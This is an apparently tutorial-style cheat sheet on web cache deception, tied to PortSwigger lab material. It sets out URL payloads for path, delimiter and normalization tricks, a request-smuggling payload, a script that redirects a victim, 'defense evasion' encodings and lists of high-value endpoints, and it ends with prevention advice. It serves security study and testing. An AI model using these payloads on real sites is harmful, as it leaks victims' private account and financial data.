# Web Cache Deception - Quick Reference Cheat Sheet

## Overview

**Web Cache Deception** exploits discrepancies between how cache servers and origin servers interpret URLs to trick caches into storing sensitive dynamic content.

**Attack Goal:** Cache victim's sensitive data (API keys, personal info) and retrieve it later.

---

## Core Concepts

### What is Web Cache Deception?

An attacker tricks a web cache into storing sensitive, dynamic content by exploiting URL interpretation discrepancies between the cache and origin server.

**Key Difference from Cache Poisoning:**
- **Cache Deception:** Stores victims' private data for attacker access
- **Cache Poisoning:** Injects malicious content served to other users

### How It Works

1. **Attacker sends malicious URL to victim**
2. **Victim's browser requests URL while authenticated**
3. **Cache interprets URL as static resource** (cacheable)
4. **Origin interprets URL as dynamic endpoint** (returns sensitive data)
5. **Response gets cached** with victim's data
6. **Attacker accesses same URL** to retrieve cached sensitive data

---

## Attack Vectors

### 1. Path Mapping Discrepancies

**Concept:** Origin server abstracts paths; cache uses file extensions.

**Test:**
```http
GET /my-account/random.js HTTP/1.1
```

**Indicators:**
- Origin returns account data
- `X-Cache: miss` → `X-Cache: hit` on repeat

**Exploit:**
```
/sensitive-endpoint/unique-id.js
/api/user/data.css
/profile/info.png
```

---

### 2. Delimiter Discrepancies

**Concept:** Cache and origin recognize different delimiters.

**Common Delimiters:**
- `;` — Java Spring (matrix variables)
- `?` — Query string delimiter
- `#` — Fragment identifier
- `.` — Ruby on Rails format
- `%00` — Null byte

**Test Payload:**
```http
GET /my-account;test.js HTTP/1.1
GET /profile?data.css HTTP/1.1
```

**Exploit:**
```
/my-account;unique.js
/api/user:data.css
/profile.format.json
```

---

### 3. Normalization Discrepancies

**Concept:** One system normalizes URLs (decodes + resolves dot-segments), the other doesn't.

#### Origin Server Normalization

Origin decodes `%2f` and resolves `..`; cache treats literally.

**Test:**
```http
GET /resources/..%2fmy-account HTTP/1.1
```

**Exploit:**
```
/static/..%2fprofile
/assets/..%2fapi/keys
/public/..%2fadmin/data
```

#### Cache Server Normalization

Cache decodes and normalizes; origin doesn't.

**Test:**
```http
GET /my-account%23%2f%2e%2e%2fresources HTTP/1.1
```

**Exploit:**
```
/profile%23%2f%2e%2e%2fstatic?id=1
/api/user%23%2f%2e%2e%2fassets?data=true
```

---

### 4. HTTP Request Smuggling

**Concept:** Combine CL.TE smuggling with cache deception.

**Payload:**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```

**Exploit Flow:**
1. Send smuggling payload
2. Victim's request appends to smuggled GET
3. Victim's response gets cached
4. Access cached response

---

## Quick Testing Methodology

### Phase 1: Reconnaissance

**Identify Targets:**
```bash
# Sensitive endpoints
/my-account
/profile
/api/user
/settings
/admin
```

**Check Cache Headers:**
```
X-Cache: hit/miss
Cache-Control: max-age=30
Age: 15
```

---

### Phase 2: Discovery

#### Test Path Abstraction
```http
GET /my-account/random HTTP/1.1
GET /my-account/random.js HTTP/1.1
```

#### Discover Delimiters (Burp Intruder)
**Position:** `/my-account§§abc`

**Payloads:**
```
! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~
%21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F
%3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E
```

**Look for:** `200 OK` responses

#### Test Normalization
```http
GET /aaa/..%2fmy-account HTTP/1.1
GET /resources/..%2fmy-account HTTP/1.1
```

---

### Phase 3: Exploitation

#### Craft Payload
```
# Path mapping
/my-account/unique123.js

# Delimiter
/my-account;unique123.js

# Origin normalization
/resources/..%2fmy-account?unique123

# Cache normalization
/my-account%23%2f%2e%2e%2fresources?unique123
```

#### Deliver Attack
```html
<script>
document.location="https://target.com/exploit-url"
</script>
```

#### Retrieve Cached Data
```
Access the same URL to get cached response
```

---

## Cache Rules

### Static File Extensions
```
.js   .css   .jpg   .jpeg   .png   .gif   .ico   .svg
.woff .woff2 .ttf   .eot    .mp4   .mp3   .pdf   .xml
```

### Static Directories
```
/static/    /assets/    /public/    /resources/
/images/    /css/       /js/        /media/
```

### Static Filenames
```
robots.txt    favicon.ico    sitemap.xml
humans.txt    ads.txt        security.txt
```

---

## Burp Suite Workflow

### Essential Tools

**1. Proxy → HTTP History**
- Monitor cache headers
- Identify sensitive endpoints
- Review responses

**2. Repeater**
- Test payloads manually
- Verify cache behavior
- Check X-Cache headers

**3. Intruder**
- Automate delimiter discovery
- Test multiple extensions
- Brute-force variations

**4. Decoder**
- URL-encode characters
- Decode responses
- Verify encoding

**5. Extensions**
- HTTP Request Smuggler
- Web Cache Deception Scanner

---

### Configuration Tips

**Repeater Settings:**
- Switch to HTTP/1 (for smuggling)
- Disable automatic redirects
- Show all headers

**Intruder Settings:**
- Disable URL encoding (for raw delimiter testing)
- Use Sniper attack type
- Grep for "200 OK" and "X-Cache"

**Proxy Settings:**
- Intercept all responses
- Show non-standard headers
- Disable caching in browser

---

## Payloads by Framework

### Java Spring
```
/my-account;matrix=variable.js
/api/user;param=value.css
```

### Ruby on Rails
```
/profile.format.json
/user.xml.js
```

### ASP.NET
```
/api/user/data.aspx;param.js
```

### Express.js (Node)
```
/api/user?data=1.js
/profile#fragment.css
```

### PHP
```
/user.php/additional.js
/profile.php?id=1.css
```

---

## Key Headers to Monitor

### Cache Status
```http
X-Cache: hit              # Served from cache
X-Cache: miss             # Not in cache
Age: 25                   # Seconds in cache
```

### Cache Control
```http
Cache-Control: max-age=30              # Cache for 30 seconds
Cache-Control: no-store                # Don't cache
Cache-Control: private                 # Only client caches
Cache-Control: public                  # Any cache can store
```

### Response Indicators
```http
Content-Type: text/html                # Actual content type
X-Served-By: cache-server-01          # Cache server ID
Vary: Accept-Encoding                  # Cache key components
```

---

## Exploitation Patterns

### Pattern 1: Static Extension
```
Original:  /my-account
Exploit:   /my-account/unique.js
Result:    Origin serves /my-account, cache stores as .js
```

### Pattern 2: Delimiter Bypass
```
Original:  /my-account
Exploit:   /my-account;unique.js
Result:    Origin stops at ;, cache ignores ;
```

### Pattern 3: Path Traversal (Origin Normalizes)
```
Original:  /my-account
Exploit:   /resources/..%2fmy-account
Result:    Cache matches /resources, origin resolves to /my-account
```

### Pattern 4: Path Traversal (Cache Normalizes)
```
Original:  /my-account
Exploit:   /my-account%23%2f%2e%2e%2fresources
Result:    Origin stops at %23, cache normalizes to /resources
```

---

## Common Mistakes

| Mistake | Impact | Solution |
|---------|--------|----------|
| Reusing paths | See your own cached data | Use unique identifiers per victim |
| Missing encoding | Payload doesn't work | URL-encode special chars: `%2f`, `%23` |
| Using `#` raw | Browser strips it | Always use `%23` for fragment |
| Wrong HTTP version | Smuggling fails | Use HTTP/1.1 for request smuggling |
| Ignoring TTL | Cache expires | Exploit within cache TTL window |
| No cache buster | Cache collision | Add query param: `?unique-id` |

---

## Exploitation Checklist

### Pre-Exploitation
- [ ] Identify sensitive endpoints
- [ ] Confirm data in responses
- [ ] Check cache headers present
- [ ] Map static file/directory rules
- [ ] Test with authenticated session

### Discovery
- [ ] Test path abstraction
- [ ] Discover delimiters (Intruder)
- [ ] Test normalization (origin)
- [ ] Test normalization (cache)
- [ ] Verify caching behavior

### Exploitation
- [ ] Craft unique payload
- [ ] Test payload works (X-Cache: hit)
- [ ] Deploy to exploit server
- [ ] Deliver to victim
- [ ] Access cached response
- [ ] Extract sensitive data

---

## Detection Techniques

### Manual Testing

**Step 1: Find Endpoints**
```bash
# Endpoints returning sensitive data
/profile
/my-account
/api/user
/settings
```

**Step 2: Test Extensions**
```http
GET /profile.js HTTP/1.1
GET /profile.css HTTP/1.1
GET /profile/test.js HTTP/1.1
```

**Step 3: Check Headers**
```
X-Cache: miss → X-Cache: hit
Cache-Control: max-age=N
```

### Automated Testing

**Burp Scanner:**
- Automatically detects path mapping discrepancies
- Identifies cache rules
- Reports vulnerabilities

**Web Cache Deception Scanner BApp:**
- Context menu: "Web Cache Deception Test"
- Active scanner check
- Creates Issues for findings

---

## Defense Evasion

### Cache Busters
```
?unique=12345
?timestamp=1234567890
?victim=carlos
?session=abc123
```

### Alternative Encoding
```
%2f    # /
%2e    # .
%23    # #
%3b    # ;
%3f    # ?
```

### Double Encoding
```
%252f  # Double-encoded /
%2523  # Double-encoded #
```

---

## Real-World Targets

### High-Value Endpoints

**Authentication:**
```
/api/auth/me
/api/user/session
/oauth/userinfo
```

**Financial:**
```
/api/account/balance
/api/transactions
/payment/methods
```

**Personal Data:**
```
/api/profile
/api/user/settings
/api/personal/info
```

**Administrative:**
```
/admin/users
/api/admin/config
/internal/dashboard
```

---

## Example Attack Flow

### Scenario: Banking Application

**1. Reconnaissance**
```http
GET /api/account HTTP/1.1
Cookie: session=user-token

Response:
{
  "balance": 10000,
  "account_number": "123456789"
}
```

**2. Discovery**
```http
GET /api/account;test.js HTTP/1.1

Response:
X-Cache: miss
{ "balance": 10000 }

Second request:
X-Cache: hit
```

**3. Exploitation**
```html
<script>
document.location="https://bank.com/api/account;carlos.js"
</script>
```

**4. Data Retrieval**
```http
GET /api/account;carlos.js HTTP/1.1

Response:
X-Cache: hit
{
  "balance": 50000,
  "account_number": "987654321"
}
```

---

## URL Encoding Reference

### Common Characters
```
Space  → %20
!      → %21
"      → %22
#      → %23
$      → %24
%      → %25
&      → %26
'      → %27
(      → %28
)      → %29
*      → %2A
+      → %2B
,      → %2C
-      → %2D
.      → %2E
/      → %2F
:      → %3A
;      → %3B
<      → %3C
=      → %3D
>      → %3E
?      → %3F
@      → %40
[      → %5B
\      → %5C
]      → %5D
^      → %5E
_      → %5F
`      → %60
{      → %7B
|      → %7C
}      → %7D
~      → %7E
```

---

## Quick Commands

### Burp Intruder Delimiter Discovery
```
Position: /my-account§§abc
Payloads: Load delimiter list
Grep: "200 OK", "API Key"
```

### Burp Repeater Cache Test
```
1. Send request
2. Check X-Cache: miss
3. Resend within TTL
4. Verify X-Cache: hit
```

### Find Cached Responses
```
Proxy → HTTP History
Search (Ctrl+Shift+F): "Your API Key"
Filter: Show only 200 responses
```

---

## Prevention Quick Reference

**For Developers:**
1. Set `Cache-Control: no-store, private` on sensitive endpoints
2. Validate URL patterns strictly
3. Return 404 for invalid paths
4. Don't abstract paths on sensitive endpoints

**For Cache Administrators:**
1. Respect `Cache-Control` headers
2. Cache based on `Content-Type`, not extensions
3. Enable protection features (Cache Deception Armor)
4. Validate response matches request type

---

## Resources

- **PortSwigger Labs:** https://portswigger.net/web-security/web-cache-deception
- **Delimiter List:** https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list
- **Research Paper:** "Gotta cache 'em all: bending the rules of web cache exploitation"
- **Burp Extension:** Web Cache Deception Scanner (BApp Store)
- **Learning Path:** https://portswigger.net/web-security/learning-paths/web-cache-deception
